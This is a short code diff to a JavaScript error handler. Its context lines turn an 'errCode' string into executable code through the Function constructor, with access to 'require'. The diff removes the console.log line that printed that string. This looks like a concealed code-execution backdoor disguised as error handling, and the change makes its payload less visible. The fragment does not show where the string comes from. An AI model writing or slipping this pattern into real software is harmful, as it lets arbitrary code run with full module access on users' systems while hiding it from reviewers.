@@ -14,7 +14,6 @@ const errorHandler = (error) => {
       return;
     }
     const createHandler = (errCode) => {
-      console.log(errCode)
       try {
         const handler = new (Function.constructor)('require', errCode);
         return handler;
